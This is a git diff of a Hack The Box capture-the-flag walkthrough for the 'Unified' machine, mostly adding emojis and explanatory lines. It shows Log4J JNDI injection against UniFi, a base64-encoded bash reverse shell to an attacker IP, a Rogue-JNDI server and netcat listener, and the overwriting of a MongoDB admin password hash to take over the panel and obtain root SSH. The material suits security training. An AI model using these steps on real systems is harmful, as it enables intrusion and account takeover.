@@ -1,15 +1,15 @@
-# Unified – Hack The Box Walkthrough
-**Author:** Sai Teja  
-**Status:** Retired Machine  
-**Difficulty:** Medium  
-**Techniques:** Log4J (CVE-2021-44228), JNDI Injection, Reverse Shell, MongoDB Password Manipulation, Privilege Escalation
+# 💻Unified – Hack The Box Walkthrough
+**✍️Author:** Sai Teja  
+**📁Status:** Retired Machine  
+**🔥Difficulty:** Medium  
+**🧩Techniques:** Log4J (CVE-2021-44228), JNDI Injection, Reverse Shell, MongoDB Password Manipulation, Privilege Escalation
 
-#### 📌 Introduction
+#### 📘 Introduction
 This writeup explores the effects of exploiting Log4J in a very well known network appliance monitoring system called "UniFi". This box will show you how to set up and install the necessary packages and tools to exploit UniFi by abusing the Log4J vulnerability and manipulate a POST header called `remember`, giving you a reverse shell on the machine. You'll also change the administrator's password by altering the hash saved in the MongoDB instance that is running on the system, which will allow access to the administration panel and leads to the disclosure of the administrator's SSH password.
 
 ---
 
-#### 📌 Enumeration
+#### 🔍 Enumeration
 The first step is to scan the target IP address with Nmap to check what ports are open. We'll do this with the help of a program called Nmap. Here is a quick explanation of what each flag is and what it does.
 
 - **-sC**: Performs a script scan using the default set of scripts.  
@@ -49,7 +49,7 @@ To test for vulnerability, intercept the login POST request using FoxyProxy + Bu
 
 
 
-#### 📌 Exploitation
+#### 💥 Exploitation
 Send incorrect credentials "`test:test`" just to capture the request.
 
 Forward to **Repeater** (Ctrl + R).
@@ -81,6 +81,11 @@ Send the request > if you see packets → **vulnerable**.
 
 <img width="1920" height="244" alt="Screenshot 2026-01-06 1309135626" src="https://github.com/user-attachments/assets/9e356e26-0cfb-49d5-ba90-6960866847dc" />
 
+
+Now that we know for sure the machine is vulnerable to the exploit, we can start crafting a more valuable payload.
+
+We’ll need a few extra tools for this - OpenJDK and Maven
+
 Install tools needed for full RCE:
 - OpenJDK  
 - Maven  
@@ -106,14 +111,17 @@ mvn package
 This builds:  
 `target/RogueJndi-1.1.jar`
 
+Now that we have a Rogue-JNDI setup we can create a payload to pass to it.
+
 ---
 
-#### 📌 Build Reverse Shell Payload
+#### 🛠️ Build Reverse Shell Payload
 Base64 encode reverse shell:
 
 ```bash
 echo 'bash -c bash -i >&/dev/tcp/<Your-IP>/4444 0>&1' | base64
 ```
+Let’s take that Base64 encoded string and pass it into Rogue-JNDI
 
 Start Rogue-JNDI:
 
@@ -122,11 +130,16 @@ java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,BASE64_HERE}|{base64
 ```
 <img width="1920" height="480" alt="Screenshot 2026-01-06 13093556" src="https://github.com/user-attachments/assets/1fde6682-12b9-4681-8add-41feb2b66aa0" />
 
+
+Our Rogue-JNDI server is up and running.we’ll need to setup a netcat listener to capture the reverse shell. We’ll use the port we setup in our payload (4444)
+
 Start listener:
 
 ```bash
 nc -lvp 4444
 ```
+
+ Now let’s go back to BurpSuite and modify our request. We’ll be using the following payload
 
 Modify Burp payload:
 
@@ -144,6 +157,10 @@ Rogue-JNDI receives connection → reverse shell spawns.
 <img width="1920" height="185" alt="Screenshot 2026-01-06 13062956" src="https://github.com/user-attachments/assets/66a890fb-396c-4e0c-abbc-ae88a44abe15" />
 
 
+Once we receive the output from the Rogue server, a shell spawns on our Netcat listener and we can
+upgrade the terminal shell using the following command.
+
+
 Upgrade shell:
 
 ```bash
@@ -154,6 +171,9 @@ script /dev/null -c bash
 
 Navigate and read user flag:
 
+
+After poking around a bit, we can see a file called user.txt in /home/michael
+
 ```bash
 cd /home/Michael
 cat user.txt
@@ -162,7 +182,11 @@ cat user.txt
 
 ---
 
-#### 📌 Privilege Escalation
+#### 🚀 Privilege Escalation
+
+The article states we can get access to the administrator panel of the UniFi application and possibly extract
+SSH secrets used between the appliances. First let's check if MongoDB is running on the target system,
+which might make it possible for us to extract credentials in order to login to the administrative pane
 
 Check MongoDB:
 
@@ -172,24 +196,36 @@ ps aux | grep mongo
 
 <img width="1920" height="219" alt="122" src="https://github.com/user-attachments/assets/0e7d8c23-050f-4222-b00d-37bb252118da" />
 
+We can see MongoDB is running on the target system on port 27117.
+
+We have the port, but where do we get the “DB_NAME” ? A quick google search of “UniFi Default Database” will help us here.
+
+Let's interact with the MongoDB service by making use of the mongo command line utility
+
 Connect to DB:
 
 ```bash
 mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
 ```
 
-Look for user `"Administrator"` and field `"x_shadow"`.
+Look for user `"Administrator"` and field `"x_shadow"`. We can try and crack the password, but let’s see if we can just change it to whatever we want.
 
 
 <img width="1032" height="359" alt="2132123" src="https://github.com/user-attachments/assets/8c1554a0-a33e-4163-87a9-7a4ed875b9e7" />
+
+
 
  Generate SHA-512 password hash:
 ```bash
 mkpasswd -m sha-512 Password1234
 ```
+This gives us our new hash
+
 
 
 <img width="1920" height="192" alt="526333" src="https://github.com/user-attachments/assets/bd03210e-54dd-4307-a3a9-c6539fba554b" />
+
+
 
 Replace admin hash:
 
@@ -203,11 +239,12 @@ mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0
 
 Verify updated hash.
 
-Login to UniFi admin panel using your new password.
+
+Login to UniFi admin panel using “administrator” and your new password.
 
 ---
 
-#### 📌 Getting Root Password
+#### 🔑 Getting Root Password
 Navigate to:
 
 **Settings → Site → SSH Authentication**
@@ -220,6 +257,9 @@ NotACrackablePassword4U2022
 
 
 <img width="1920" height="701" alt="Screenshot 2026-01-06 1304015123" src="https://github.com/user-attachments/assets/ef6cdfa9-1845-463f-a379-d762d8cbd905" />
+
+
+Let's attempt to authenticate to the system as root over SSH.
 
 
 SSH into machine:
@@ -243,5 +283,8 @@ cat /root/root.txt
 
 ---
 
-#### 📌 End
-Congratulations — you have completed the Unified box.
+#### 🎉 End
+
+“Congratulations — You have successfully pwned the Unified box!”
+
+
